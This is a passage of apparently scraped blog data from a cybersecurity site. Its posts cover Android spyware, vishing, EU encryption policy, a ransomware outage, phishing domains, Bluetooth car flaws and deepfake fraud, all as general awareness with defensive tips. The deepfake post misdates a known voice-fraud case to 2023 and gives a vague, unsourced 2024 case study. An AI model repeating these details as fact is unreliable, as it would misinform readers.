    <p>The name <em>Catwatchful</em> comes from its stealthy, watchful behavior — quietly observing victims while keeping itself hidden from detection.</p>

    <h3>🎭 How Does Catwatchful Infect Devices?</h3><br>
    <p>The spyware is usually distributed as <strong>fake apps</strong> — often utilities, games, or social tools — that users download outside of the official Google Play Store. In particular, attackers rely on:</p>
    <ul>
      <li>Untrusted APK download sites and forums</li>
      <li>Malicious ads prompting users to “update” or “optimize” their phone</li>
      <li>Phishing SMS messages with malicious APK download links</li>
      <li>Social engineering tactics that promise exclusive content or discounts</li>
    </ul>

    <p>Once installed, the app requests a long list of permissions, including admin rights, making it very difficult to remove. Even after rebooting, the spyware remains active — recording data and transmitting it back to the attackers.</p>

    <h3>🔍 What Kind of Data Does It Steal?</h3><br>
    <p>Catwatchful is designed to harvest <strong>as much personal and sensitive information as possible</strong>. This includes:</p>
    <ul>
      <li>👤 Usernames, passwords, and saved login credentials</li>
      <li>📞 Call history, contact lists, and ongoing call recordings</li>
      <li>💬 SMS and instant messaging conversations</li>
      <li>📷 Photos, videos, and voice recordings</li>
      <li>🌍 GPS coordinates, movement patterns, and location history</li>
      <li>📱 Device information like IMEI, model, and network details</li>
    </ul>

    <p>The stolen data can be sold on dark web marketplaces, used for identity theft, or even exploited in targeted extortion campaigns.</p>

    <h3>🚨 Why Is This Campaign Alarming?</h3><br>
    <p>Catwatchful is notable for its:</p>
    <ul>
      <li>🌐 Global reach — affecting victims in dozens of countries</li>
      <li>📈 Scale — over 62,000 compromised accounts and growing</li>
      <li>🤐 Stealth — hiding in plain sight and avoiding detection by many antivirus tools</li>
      <li>💻 Attacker sloppiness — leaving the stolen data on an unsecured server, enabling discovery</li>
    </ul>

    <p>This shows not only how effective social engineering and sideloading attacks still are, but also how carelessly some attackers handle stolen data once collected.</p>

    <h3>🛡️ How You Can Stay Safe</h3><br>
    <p>Here’s how to defend yourself against Catwatchful and similar spyware campaigns:</p>
    <ul>
      <li>✅ Never download APKs from untrusted or unofficial sources</li>
      <li>✅ Enable Google Play Protect and use a reputable mobile security app</li>
      <li>✅ Review app permissions after installation — revoke unnecessary access</li>
      <li>✅ Don’t grant admin rights to apps you don’t fully trust</li>
      <li>✅ Keep your Android OS and apps updated with security patches</li>
      <li>✅ Regularly audit your device for suspicious apps or high data usage</li>
      <li>✅ Change passwords if you suspect compromise and enable multi-factor authentication (MFA)</li>
    </ul>

    <h3>🌟 Lessons for the Future</h3><br>
    <p>The Catwatchful incident reminds us that mobile devices are treasure troves of sensitive data — and attackers know it. With millions of Android users worldwide still sideloading apps and ignoring permissions, campaigns like Catwatchful are likely to continue thriving.</p>

    <p>Education, vigilance, and modern security tools are essential to keep your data and privacy intact.</p>

    <blockquote>🐾 A watchful cat sees everything — but so should you. Don’t let spyware stalk your phone.</blockquote>
  `},{id:"vishing-rise-australia-qantas-breach",title:"Vishing Attacks Surge in Australia Following Qantas Breach: How AI and Social Engineering Exploit the Human Factor",date:"2025-07-07",author:"Ethical Byte",summary:"Australia’s privacy watchdog reports a sharp rise in vishing attacks after the Qantas breach, exposing how attackers exploit trust and urgency to bypass digital defenses.",tags:["vishing","social engineering","qantas breach","ai phishing","australia","human factor"],imageKey:"vishingQantas",content:`
    <h3>📞 Vishing Is Back — and Smarter Than Ever</h3><br>
    <p>In the wake of the highly publicized <strong>Qantas data breach</strong>, Australia’s Office of the Australian Information Commissioner (OAIC) issued a sobering warning: <strong>vishing (voice phishing) attacks have surged by 46%</strong> nationwide.</p>

    <p>While much attention has focused on technical vulnerabilities, the Qantas breach highlights another critical weak spot — humans. Attackers are now using more sophisticated methods, even <strong>AI-generated voices</strong>, to trick employees into handing over access and data over the phone.</p>

    <h3>🔍 What Exactly Is Vishing?</h3><br>
    <p>Vishing — short for “voice phishing” — is a social engineering tactic where cybercriminals call their targets, posing as trusted figures such as IT support, managers, or even law enforcement. Their goal? To manipulate victims into providing sensitive information, approving access, or performing actions that compromise security.</p>

    <p>Recent vishing calls tied to the Qantas breach include:</p>
    <ul>
      <li>Posing as help desk technicians requesting login credentials to fix an “urgent outage”</li>
      <li>Imitating senior managers demanding immediate action to avoid penalties</li>
      <li>Using cloned AI voices to sound exactly like a known supervisor or coworker</li>
    </ul>

    <h3>🎭 Why Are Humans the Weakest Link?</h3><br>
    <p>Attackers rely on a few predictable human traits:</p>
    <ul>
      <li>⏳ <strong>Urgency</strong> — “We need this fixed NOW or the company loses money”</li>
      <li>🎩 <strong>Authority</strong> — “This is your manager. Just give me the password.”</li>
      <li>🤝 <strong>Trust</strong> — “I’m from IT. We spoke yesterday.”</li>
    </ul>

    <p>Combined with high stress environments, like customer support or call centers, these tactics often succeed — even against trained employees.</p>

    <h3>🧪 What’s New About These Attacks?</h3><br>
    <p>What makes this current wave of vishing more dangerous is the integration of <strong>artificial intelligence (AI)</strong>:</p>
    <ul>
      <li>🤖 AI voice cloning replicates tone, accent, and speech patterns of real people</li>
      <li>🎙️ Deepfake audio can even simulate conference calls or voicemails from executives</li>
      <li>📈 Attackers script dynamic, context-aware conversations instead of static pretexts</li>
    </ul>

    <p>This means employees can no longer rely on “recognizing the voice” or gut feeling alone to detect fraud.</p>

    <h3>📉 Lessons from the Qantas Breach</h3><br>
    <p>Investigators suspect that attackers gained initial access to Qantas systems by tricking a third-party call center employee via a vishing call. From there, they escalated privileges and moved laterally across networks, resulting in massive customer data exposure and operational disruption.</p>

    <p>This incident underlines the fact that even the best firewalls and endpoint protections can’t stop someone who’s verbally persuaded to open the door.</p>

    <h3>🛡️ OAIC’s Recommendations</h3><br>
    <p>The OAIC has outlined a set of best practices to defend against vishing:</p>
    <ul>
      <li>✅ Require <strong>multi-factor verification</strong> before making account changes or granting access</li>
      <li>✅ Educate employees about AI-enabled social engineering techniques</li>
      <li>✅ Empower staff to challenge and escalate suspicious calls without fear of reprimand</li>
      <li>✅ Enforce strict protocols for verifying the identity of callers requesting sensitive actions</li>
      <li>✅ Audit third-party vendors regularly and hold them to the same security standards</li>
      <li>✅ Deploy voice authentication or anomaly detection tools where applicable</li>
    </ul>

    <h3>🌎 Beyond Australia: A Global Concern</h3><br>
    <p>While this warning was issued in Australia, the threat is not limited by geography. Similar attacks have been reported in the U.S., U.K., and Asia — often tied to breaches in industries like aviation, finance, and healthcare.</p>

    <p>In our hyper-connected, high-pressure workplaces, anyone with a phone can be a target — and a gateway — for attackers.</p>

    <h3>🧠 Final Thoughts</h3><br>
    <p>The Qantas breach and subsequent vishing surge are stark reminders that cyber defense is not just about technology — it’s about people. The human element remains the most exploited vulnerability in security.</p>

    <p>Organizations that invest in awareness, clear policies, and support for employees who “pause and verify” will be far better positioned to fend off these attacks.</p>

    <blockquote>📞 Think before you speak. The voice on the line might not be who you think it is.</blockquote>
  `},{id:"eu-decrypt-private-data-protecteu",title:"The EU Wants to Decrypt Citizens’ Private Data by 2030: What It Means for Your Privacy",date:"2025-07-08",author:"Ethical Byte",summary:"The European Union’s ProtectEU plan proposes lawful access to encrypted communications by 2030 — sparking a heated debate on privacy, security, and human rights.",tags:["eu","encryption","privacy","surveillance","protecteu","human rights"],imageKey:"euProtectEU",content:`
    <h3>🔐 The EU’s ProtectEU Plan Explained</h3><br>
    <p>In July 2025, the European Union announced a controversial proposal under its <strong>ProtectEU initiative</strong> to grant law enforcement agencies <strong>lawful access to encrypted communications by 2030</strong>. The plan would effectively allow authorities to decrypt private messages sent through popular end-to-end encrypted (E2EE) platforms like <em>WhatsApp, Signal, iMessage, and others</em>.</p>

    <p>The EU argues that strong encryption—while vital for privacy—also enables criminals to operate in secrecy. ProtectEU is positioned as a way to combat <strong>child exploitation, terrorism, and organized crime</strong> without completely dismantling privacy protections.</p>

    <h3>🧪 How Would This Work?</h3><br>
    <p>The ProtectEU proposal envisions a future where technology firms build “<strong>lawful interception</strong>” solutions into their platforms, allowing authorized law enforcement—under a valid court order—to decrypt and access messages. This would require adding a <strong>backdoor mechanism</strong> to break E2EE on demand.</p>

    <h3>🕵️ Why Privacy Advocates Are Alarmed</h3><br>
    <p>Critics, including privacy groups, cybersecurity experts, and human rights organizations, argue that adding backdoors to encryption is fundamentally dangerous because:</p>
    <ul>
      <li>⚠️ <strong>Weakened Security:</strong> Any backdoor, no matter how well-intentioned, can be discovered and abused by hackers or hostile states.</li>
      <li>⚠️ <strong>Erosion of Trust:</strong> Users may stop using platforms perceived as insecure, undermining confidence in the digital ecosystem.</li>
      <li>⚠️ <strong>Scope Creep:</strong> Measures designed for one purpose (e.g., fighting terrorism) could expand to surveil dissent or target minorities.</li>
    </ul>

    <h3>⚖️ The EU’s Justification</h3><br>
    <p>The EU insists that:</p>
    <ul>
      <li>✅ Only <strong>authorized law enforcement</strong> with court oversight would have access.</li>
      <li>✅ ProtectEU aims to balance security and privacy via strict legal and technical controls.</li>
      <li>✅ They seek cooperation from tech companies to create solutions that minimize abuse risk.</li>
    </ul>

    <h3>🌍 What This Means for Users</h3><br>
    <p>If implemented, ProtectEU could reshape the way privacy and security are balanced across Europe — and potentially set a precedent globally. Users may see changes in:</p>
    <ul>
      <li>🔒 Encryption standards and app functionality</li>
      <li>📄 Privacy policies of communication platforms</li>
      <li>👀 Who can access their messages and under what conditions</li>
    </ul>

    <h3>🧠 Key Concerns & Potential Risks</h3><br>
    <ul>
      <li>Cybercriminals exploiting built-in backdoors</li>
      <li>Political misuse of surveillance powers</li>
      <li>Chilling effect on freedom of speech and journalism</li>
      <li>Fragmentation of global internet standards if users flee to services outside the EU</li>
    </ul>

    <h3>✅ What Can You Do?</h3><br>
    <p>Until ProtectEU becomes law (if it does), you can still protect your digital privacy:</p>
    <ul>
      <li>🔍 Stay informed about policy changes and debates.</li>
      <li>📣 Participate in public consultations, petitions, or advocacy efforts if you value strong encryption.</li>
      <li>🛑 Avoid platforms already weakening encryption or collecting excessive metadata.</li>
      <li>🗝️ Choose apps committed to robust, transparent, and zero-knowledge encryption as long as legally permitted.</li>
    </ul>

    <h3>🌟 Final Thoughts</h3><br>
    <p>The EU’s ProtectEU plan ignites an age-old debate: how much privacy are we willing to sacrifice for security? While stopping crime is essential, creating systemic weaknesses in encryption could endanger everyone — not just the guilty.</p>

    <blockquote>🔐 Privacy isn’t just about hiding something; it’s about protecting everyone. Once the backdoor is open, no one knows who will walk through it.</blockquote>
  `},{id:"ransomware-attack-ingram-micro-2025",title:"Ransomware Attack Disrupts Global Operations at Ingram Micro",date:"2025-07-09",author:"Ethical Byte",summary:"One of the world’s largest IT distributors, Ingram Micro, suffered a ransomware attack causing widespread outages, disrupting global supply chains, and raising serious questions about resilience in critical industries.",tags:["ransomware","ingram micro","supply chain","it distribution","incident response","cyber resilience"],imageKey:"ingramMicroRansomware",content:`
    <h3>💻 Ingram Micro Hit by Ransomware</h3><br>
    <p>Just before the July 4 holiday weekend, <strong>Ingram Micro</strong>, a critical player in global IT distribution, was targeted in a major <strong>ransomware attack</strong> that disrupted its systems and operations worldwide.</p>

    <p>The attack forced Ingram Micro to shut down parts of its network, halting customer order processing and some internal workflows to prevent further damage and limit the spread of malware. Law enforcement and cybersecurity experts were brought in immediately to investigate and assist with recovery.</p>

    <h3>🕵️ What We Know So Far</h3><br>
    <ul>
      <li>🏢 Ingram Micro confirmed its IT infrastructure was compromised by ransomware.</li>
      <li>📉 Systems handling procurement, logistics, and partner interactions went offline.</li>
      <li>🔎 No public evidence yet of stolen or leaked data, though investigations continue.</li>
      <li>⏳ Recovery is ongoing — while some services have been restored, full restoration is expected to take time.</li>
    </ul>

    <h3>🌎 Global Impact of the Outage</h3><br>
    <p>Ingram Micro’s role as an intermediary between manufacturers, resellers, and end customers means its disruption reverberates across the IT industry supply chain:</p>
    <ul>
      <li>🚫 Delays in fulfilling hardware & software orders.</li>
      <li>📦 Logistics bottlenecks for resellers & partners dependent on its distribution network.</li>
      <li>🌐 End customers experiencing extended lead times and order confusion.</li>
      <li>💰 Potential financial losses and contractual penalties for all involved parties.</li>
    </ul>

    <p>This incident highlights how a single cyberattack on a pivotal supplier can create a domino effect, disrupting hundreds or thousands of businesses downstream.</p>

    <h3>📣 Ingram Micro’s Response</h3><br>
    <p>In a statement, Ingram Micro emphasized their commitment to recovery and security:</p>
    <ul>
      <li>✅ “We are working diligently to restore operations securely and as quickly as possible.”</li>
      <li>✅ Law enforcement and third-party cybersecurity teams are involved in mitigation efforts.</li>
      <li>✅ Customers are encouraged to contact account managers for the most current updates.</li>
    </ul>

    <h3>⚖️ Why Supply Chains Are Attractive Targets</h3><br>
    <p>Supply chain hubs like Ingram Micro are lucrative ransomware targets because they touch thousands of businesses — amplifying the impact and urgency of the attack. By disrupting a critical node in the chain, attackers increase their leverage and the likelihood of ransom payments.</p>

    <p>Similar incidents have previously struck companies like Colonial Pipeline, Maersk, and Kaseya, proving this is a persistent and evolving threat.</p>

    <h3>🧪 How Ransomware Campaigns Typically Work</h3><br>
    <p>Though details of the attack are still emerging, ransomware campaigns often follow this pattern:</p>
    <ul>
      <li>🎣 Initial access via phishing, credential theft, or vulnerable systems.</li>
      <li>🛠️ Lateral movement to compromise critical servers and backups.</li>
      <li>🔒 Deployment of ransomware payload to encrypt files & systems.</li>
      <li>💰 Ransom demand in cryptocurrency in exchange for decryption keys.</li>
    </ul>

    <h3>🔐 Lessons & Recommendations for Customers and Partners</h3><br>
    <p>While Ingram Micro works to restore systems, customers and partners should take these steps:</p>
    <ul>
      <li>🔒 Stay in regular contact with your Ingram Micro representatives for updates.</li>
      <li>📑 Review and validate orders placed just before and after the outage.</li>
      <li>🛑 Be wary of phishing emails posing as Ingram Micro during recovery efforts.</li>
      <li>💼 Assess your own business continuity & disaster recovery plans to handle supplier disruptions.</li>
      <li>🌐 Consider diversifying critical suppliers where possible to reduce dependency risks.</li>
    </ul>

    <h3>🌟 Final Thoughts</h3><br>
    <p>The Ingram Micro ransomware incident is a stark reminder of the fragility of interconnected supply chains and the immense cost of insufficient cyber resilience. Protecting critical suppliers — and holding them to high security standards — is no longer optional but essential for business continuity.</p>

    <p>As attackers continue to exploit high-value nodes in global networks, organizations must prepare for not just direct attacks but also collateral damage from breaches in their ecosystem.</p>

    <blockquote>💻 In supply chains, you’re only as strong as your weakest link. Stay vigilant, diversify risk, and build resilience before the next attack hits.</blockquote>
  `},{id:"malicious-es-domains-cloudflare",title:"Malicious .es Domains Surge: Hosted on Cloudflare, Random Names Help Defenders Spot Them",date:"2025-07-10",author:"Ethical Byte",summary:"Researchers report a 19× rise in malicious .es domains hosted on Cloudflare, using randomly generated names for phishing — which ironically makes them easier to detect.",tags:[".es domains","phishing","cloudflare","malware","domain security","tld threats"],imageKey:"maliciousEsDomains",content:`
    <h3>🌐 Malicious .es Domains on the Rise</h3><br>
    <p>According to a July 2025 report from <strong>Cofense</strong>, security researchers have detected a sharp <strong>19× increase</strong> in malicious domains using Spain’s country-code TLD (<strong>.es</strong>) over the past six months.</p>

    <p>Nearly all of these domains were hosted via <strong>Cloudflare</strong>, which attackers exploit for its fast content delivery, global reach, and masking capabilities. But while this makes the campaigns effective, it also leaves behind clues defenders can use.</p>

    <h3>🕵️ What Makes These Domains Suspicious?</h3><br>
    <p>Researchers noticed that these malicious domains featured <strong>machine-generated, random-looking subdomain names</strong> — nonsensical strings of characters that are highly unlikely to belong to legitimate Spanish businesses.</p>

    <p>Examples include domains like:</p>
    <ul>
      <li>ag7sr.fjlabpkgcuo.es</li>
      <li>f9bxk.ztrmqvyheso.es</li>
      <li>qx1jp.lkhdxvenbty.es</li>
    </ul>

    <p>These names are generated automatically so attackers can spin up thousands of unique domains rapidly and bypass traditional blocklists.</p>

    <h3>⚠️ Why It Matters</h3><br>
    <ul>
      <li>🚩 Random names help attackers evade blocklists but also make them stand out to defenders.</li>
      <li>🌍 Many phishing campaigns spoof well-known brands but use meaningless domains, which savvy users and tools can catch.</li>
      <li>🔓 Hosting on Cloudflare provides attackers with anonymity and performance, but defenders can monitor .es TLD traffic for anomalies.</li>
    </ul>

    <h3>📧 How Are These Domains Used?</h3><br>
    <p>The vast majority of these domains are used for <strong>credential phishing campaigns</strong> targeting major global brands. Cofense’s analysis showed:</p>
    <ul>
      <li>Microsoft — spoofed in 95% of observed campaigns</li>
      <li>Adobe</li>
      <li>Google</li>
      <li>DocuSign</li>
      <li>U.S. Social Security Administration</li>
    </ul>

    <p>Beyond phishing, a smaller number of domains delivered malware, including Remote Access Trojans (RATs) like <strong>XWorm</strong>, <strong>Dark Crystal</strong>, and <strong>ConnectWise</strong>.</p>

    <h3>🔐 What Can Defenders Do?</h3><br>
    <p>Fortunately, the randomness of these domains provides a useful detection opportunity. Defenders are encouraged to:</p>
    <ul>
      <li>✅ Implement domain heuristics to detect and block nonsensical, random-looking names.</li>
      <li>✅ Actively monitor .es TLD traffic, even if your organization doesn’t have Spanish operations.</li>
      <li>✅ Be wary of domains hosted on Cloudflare with no branding or clear ownership.</li>
      <li>✅ Educate employees about phishing tactics, especially those spoofing major brands.</li>
    </ul>

    <h3>📊 Example Pattern of Suspicious Domains</h3><br>
    <p>Below are examples of the kinds of domains flagged by researchers:</p>
    <ul>
      <li>ag7sr.fjlabpkgcuo.es</li>
      <li>r4ykp.hdlmcxzqjvo.es</li>
      <li>j2kxl.ptnvhwyeqrz.es</li>
    </ul>

    <p>Note the meaningless subdomains and their use of .es — patterns defenders can use to build detection rules.</p>

    <h3>🧠 Final Thoughts</h3><br>
    <p>Attackers will continue innovating, but sometimes their automation creates obvious patterns. These .es domains are a perfect example: randomized names intended to evade blocklists actually make them <strong>easier for defenders to flag</strong>.</p>

    <blockquote>🌐 Stay vigilant. Look beyond the TLD — focus on patterns and anomalies that attackers can’t hide.</blockquote>
  `},{id:"perfektblue-bluetooth-car-hacking",title:"PerfektBlue Attack Exposes Millions of Connected Vehicles to Remote Bluetooth Hacking",date:"2025-07-11",author:"Ethical Byte",summary:"Critical vulnerabilities in a popular Bluetooth stack expose millions of vehicles to remote hacking. Here’s everything you need to know about PerfektBlue and how to protect yourself.",tags:["perfektblue","bluetooth","car hacking","automotive cybersecurity","openskynergy","iot security"],imageKey:"perfektBlueCarHack",content:`
    <h3>🚗 PerfektBlue: A New Threat to Connected Vehicles</h3><br>
    <p>On July 11, researchers uncovered a set of critical vulnerabilities in <strong>OpenSynergy’s Blue SDK</strong> — a Bluetooth protocol stack integrated into millions of connected vehicles around the world. This attack, named <strong>PerfektBlue</strong>, highlights how attackers can exploit flaws in the car’s wireless interface to gain control without even touching it.</p>

    <h3>🪲 What Happened?</h3><br>
    <p>The vulnerabilities lie in the way Blue SDK processes certain malformed Bluetooth packets. Attackers within wireless range can craft malicious packets to crash the Bluetooth stack or gain control over the car’s infotainment and diagnostic systems — potentially even affecting safety-critical components.</p>

    <p>This means attackers can:</p>
    <ul>
      <li>🎙️ Eavesdrop on conversations or data transmissions.</li>
      <li>🖥️ Inject malicious code into vehicle systems.</li>
      <li>⚠️ Manipulate driver-assist features or disable alerts.</li>
    </ul>

    <h3>📡 Why It Matters</h3><br>
    <p>Modern vehicles are essentially mobile computers — and Bluetooth is a key interface for drivers to connect their devices. With PerfektBlue, attackers can bypass physical security measures entirely, attacking cars wirelessly from a parking lot, street, or even another vehicle.</p>

    <p>Such attacks could expose personal data, interfere with driving, or serve as a stepping stone for further compromises — a significant risk as cars become increasingly autonomous and connected.</p>

    <h3>🧪 How Does the Attack Work?</h3><br>
    <p>The flaw comes from improper validation of malformed or malicious Bluetooth messages by the Blue SDK. Attackers use a laptop and a Bluetooth antenna to craft packets that exploit these flaws, leading to:</p>
    <ul>
      <li>🚫 Denial of service (crashing the stack).</li>
      <li>📥 Remote code execution inside the vehicle’s systems.</li>
    </ul>

    <p>Since Bluetooth has a limited range, attackers must be within tens of meters — but in crowded urban areas or parking structures, that’s trivial to achieve.</p>

    <h3>🛞 Who’s Affected?</h3><br>
    <ul>
      <li>✅ Vehicles from multiple, yet-unnamed manufacturers that use OpenSynergy’s Blue SDK.</li>
      <li>✅ Infotainment units and possibly other IoT devices built with the same stack.</li>
    </ul>

    <p>Researchers have notified OpenSynergy, which is preparing and distributing patches to automakers and vendors.</p>

    <h3>🚨 Real-World Scenario</h3><br>
    <p>Picture this: you park your car at a mall. A hacker nearby scans for vulnerable vehicles. They send crafted Bluetooth packets to your car, crashing its infotainment system, stealing contact lists, or disabling driver-assist warnings — all without touching the car. PerfektBlue turns a harmless convenience into a dangerous backdoor.</p>

    <h3>🔧 What You Should Do</h3><br>
    <p><strong>For Automakers & Suppliers:</strong></p>
    <ul>
      <li>✅ Deploy OpenSynergy’s firmware updates as soon as available.</li>
      <li>✅ Inform customers about risks and patch timelines transparently.</li>
      <li>✅ Audit current vehicle configurations for Bluetooth security posture.</li>
    </ul>

    <p><strong>For Drivers:</strong></p>
    <ul>
      <li>📱 Contact your dealer/service center and ask about software updates.</li>
      <li>🔒 Turn off Bluetooth when not in use to minimize exposure.</li>
      <li>🚨 Pay attention to strange behavior in your infotainment or safety systems and report it.</li>
    </ul>

    <p><strong>For Security Teams:</strong></p>
    <ul>
      <li>🧪 Test all patches thoroughly before rollout.</li>
      <li>📡 Monitor for suspicious Bluetooth activity in parking lots and corporate facilities.</li>
      <li>🔬 Regularly review and harden your fleet’s wireless configurations.</li>
    </ul>

    <h3>🌟 Key Lessons</h3><br>
    <p>The PerfektBlue attack reminds us that every connected feature comes with risk. Cars, like smartphones and laptops, need constant vigilance and updates to stay secure. Bluetooth is convenient, but also a gateway — and attackers are watching.</p>

    <blockquote>🚗 Treat your car like your phone: every wireless connection is a potential door. Make sure you’re the only one holding the keys.</blockquote>
  `},{id:"cyber-talk-july",title:"Join Us for Cyber Talk 2025 – Your Questions, Answered!",date:"2025-07-12",author:"Team EthicalByte",summary:"A live, interactive cybersecurity event hosted by EthicalByte’s CEO , COO & CTO, where we decode trends, certifications, tools, and career paths in cyber. Register now and take the first step toward your future in cybersecurity.",tags:["event","cybersecurity career","certifications","ethicalbyte","future of cybersecurity"],imageKey:"cyberTalk2025Banner",content:`
    <div style="background-color:#f5f7fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
      <h3 style="color:#1e2f48;margin-top:0;">🚨 <br> Cyber Talk 2025 <br>Live Cybersecurity Career Event</h3><br>
      <p><strong>Hosted by:</strong> EthicalByte CEO, COO & CTO</p>
      <p><strong>Date:</strong> July 12, 2025</p>
      <p><strong>Format:</strong> Virtual + Interactive Q&A</p>
      <p>Whether you're a beginner or already exploring the cybersecurity space, this event is designed to give you clarity, direction, and insider knowledge on how to grow in cybersecurity in 2026 and beyond.</p>
      
      <div style="text-align:center; margin: 20px 0;">
        <a href="https://tally.so/r/3j4aN1" target="_blank" style="background:#2563eb;color:#fff;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:bold;display:inline-block;">📩 Register Now</a>
      </div>
      
      <h3>📌 What We’ll Cover</h3><br>
      <ul>
        <li><strong>Do you need cybersecurity certifications?</strong> Which ones actually matter in 2026?</li>
        <li><strong>Should you pursue a degree in cybersecurity?</strong> Pros, cons, and alternatives.</li>
        <li><strong>What should you learn first?</strong> Tools, skills, and the right mindset for beginners.</li>
        <li><strong>Is coding required?</strong> What domains need it—and which don’t.</li>
        <li><strong>Building a home lab:</strong> Tools, platforms, and legal hacking practice.</li>
        <li><strong>How to land your first job or internship?</strong> Resume tips, portfolio advice, and where to apply.</li>
        <li><strong>Specialist or generalist?</strong> Choosing your cybersecurity path smartly.</li>
      </ul>

      <h3>🎙️ Expert Panel</h3><br>
      <p>This session will be hosted by our <strong>CEO</strong> and <strong>CTO , COO</strong> who bring years of industry knowledge, startup experience, and mentorship insights. Expect practical advice—not just theory.</p>

      <h3>🛠️ Interactive Q&A</h3><br>
      <p>Ask anything! We’ll be answering live questions from the audience. Whether it’s about hacking tools, certifications, lab setup, or career doubts—this is your chance to ask directly.</p>

      <h3>🎯 Who Should Attend?</h3><br>
      <ul>
        <li>College students exploring cybersecurity</li>
        <li>Beginners who want to enter the field in 2026</li>
        <li>Professionals looking to upskill or switch careers</li>
        <li>Anyone curious about certifications, hacking tools, or job preparation</li>
      </ul>

      <h3>🚀 Why Attend?</h3><br>
      <p>This is not just a session—it’s a career starter. Real strategies. Real clarity. From real experts. Let EthicalByte help you plan your journey into the world of cybersecurity.</p>

      <div style="margin-top:30px;text-align:center;">
        <a href="https://tally.so/r/3j4aN1" target="_blank" style="background:#007bff;color:#fff;padding:14px 28px;border-radius:8px;text-decoration:none;font-size:16px;font-weight:bold;">🚀 Secure Your Seat</a>
      </div>
    </div>
  `},{id:"rise-of-deepfake-attacks",title:"The Rise of Deepfake Attacks: A Growing Cybersecurity Nightmare",date:"2025-07-11",author:"Harshit Agarwal & Dr. Neetha S.S",summary:"Deepfakes have evolved from harmless fun to a dangerous cyber threat undermining trust itself. This blog explores how deepfake attacks work, real-world examples, and how individuals & organizations can defend against them.",tags:["deepfake","cybersecurity","AI threats","trust","Christ University"],imageKey:"deepfakeThreatBanner",content:`
    <div style="padding:20px;border-radius:12px;border:1px solid #ddd;">
      
      <h3>When AI Becomes a Weapon: The New Reality of Deepfake Attacks</h3><br>
      <p>Deepfakes started as a novelty—funny memes, celebrity face swaps, or creative videos. But those days of innocent entertainment are gone. Today, deepfake technology has evolved into a sophisticated weapon in the hands of cybercriminals, capable of causing reputational, financial, and even geopolitical damage.</p>
      
      <p>Unlike traditional cyber threats that target systems and data, deepfakes target something far more valuable: <strong>trust</strong>. If you can’t believe what you see or hear, human communication itself starts to crumble. With the rapid evolution of AI, these attacks are becoming more frequent, convincing, and dangerous.</p>
      
      <h3>Anatomy of a Deepfake Attack</h3><br>
      <p>Picture this: you’re a finance manager, and you receive a video call from your CEO urgently asking to transfer ₹4 crores to a vendor. The voice, the face — everything seems authentic, but something feels … off. Welcome to the new era of CEO fraud, powered by deepfakes.</p>
      
      <p>Deepfakes use AI to craft hyper-realistic audio and video, indistinguishable from reality to the untrained eye. Here are some ways cybercriminals exploit this technology:</p>
      <ul>
        <li><strong>CEO Fraud 2.0:</strong> Instead of spoofed emails, attackers now create convincing video calls requesting urgent fund transfers.</li>
        <li><strong>Disinformation Avalanche:</strong> Fake videos manipulate stock prices, sway elections, and damage reputations in hours.</li>
        <li><strong>Identity Theft on Steroids:</strong> Synthetic videos of individuals are used for blackmail, fraud, or harassment.</li>
        <li><strong>The Revenge Factor:</strong> Personal vendettas turn digital with deepfake-driven harassment and psychological trauma.</li>
      </ul>

      <p>In 2023, a major energy company lost over $240,000 after a deepfake audio of their CFO was used to convince an employee to authorize a transfer. Similar attacks have targeted political campaigns, celebrities, and even journalists—showing how no one is immune.</p>

      <h3>The Science Behind the Deception</h3><br>
      <p>At the core of deepfakes lie <strong>Generative Adversarial Networks (GANs)</strong> — two AI systems in constant battle. One generates fake content while the other tries to detect it, improving each iteration until the fake becomes indistinguishable from reality. This adversarial training process makes deepfakes more sophisticated with each generation.</p>
      
      <p>This technology, once confined to research labs, is now easily accessible through open-source software and even mobile apps. With just a smartphone and some creativity, anyone can create a deepfake convincing enough to deceive colleagues, clients, and even family members.</p>

      <h3>Why Are Deepfakes So Effective?</h3><br>
      <p>Humans are hardwired to trust their senses. Seeing is believing—or so we thought. Deepfakes exploit this cognitive bias, creating an emotional response before critical thinking kicks in. Moreover, in moments of urgency—like financial requests or crises—victims are less likely to pause and verify authenticity.</p>

      <p>This psychological manipulation makes deepfakes not just a technical challenge, but a human one too.</p>

      <h3>Fighting Fire with Fire: How to Defend Against Deepfakes</h3><br>
      <p>While deepfakes are advancing rapidly, so are our defense mechanisms. Here are actionable strategies:</p>

      <h3>1️⃣ Train Your Human Firewall</h3><br>
      <ul>
        <li><strong>Trust but Verify:</strong> Institute mandatory verification protocols for financial and sensitive requests.</li>
        <li><strong>Spot the Signs:</strong> Look for unnatural blinking, inconsistent lighting, poor lip-syncing, robotic audio—these are common giveaways.</li>
        <li><strong>Conduct Deepfake Drills:</strong> Make security training engaging and realistic by simulating deepfake scenarios.</li>
      </ul>

      <h3>2️⃣ Deploy the Tech Arsenal</h3><br>
      <ul>
        <li><strong>Watermarking:</strong> Embed invisible digital fingerprints in authentic content to verify originality.</li>
        <li><strong>AI vs. AI:</strong> Use AI tools that analyze pixel-level anomalies and voiceprint patterns to detect deepfakes.</li>
        <li><strong>Next-Gen Biometrics:</strong> Move beyond facial recognition to heartbeat patterns, breathing analysis, and subtle micro-expressions.</li>
      </ul>

      <h3>3️⃣ Build a Security-First Culture</h3><br>
      <ul>
        <li>Encourage skepticism without fostering fear.</li>
        <li>Use multiple communication channels for critical decisions—don’t rely solely on video or audio.</li>
        <li>Stay informed about the latest deepfake trends and detection tools.</li>
      </ul>

      <h3>The Road Ahead: A Personal Reflection</h3><br>
      <p>Deepfakes challenge a fundamental human assumption: that our senses don’t lie. But like any disruptive technology, they bring both risks and opportunities. With awareness, education, and the right tools, we can turn the tide.</p>
      
      <p>We must remain vigilant without succumbing to paranoia, skeptical yet humane, and harness technology to defend rather than fear. In the battle between authentic human connection and artificial deception, we still have the upper hand—if we’re smart and proactive about it.</p>

      <h3>Real-World Case Study: The Power of a Single Deepfake</h3><br>
      <p>In 2024, a fabricated video of a political leader making inflammatory statements went viral overnight, sparking protests and a temporary market crash. Analysts later confirmed it was a deepfake—but the damage was already done. This illustrates the urgency of building resilience against such attacks at both individual and institutional levels.</p>

      <h3>About the Authors</h3><br>
      <p><strong>Harshit Agarwal</strong> is a BCA student at Christ University with a focus on cybersecurity and emerging digital threats.</p>
      <p><strong>Dr. Neetha S.S</strong> is an Assistant Professor of Computer Science at Christ University, specializing in cybersecurity, AI, and digital forensics. Together, they bring academic insight and fresh perspective into the growing menace of deepfakes.</p>
    </div>
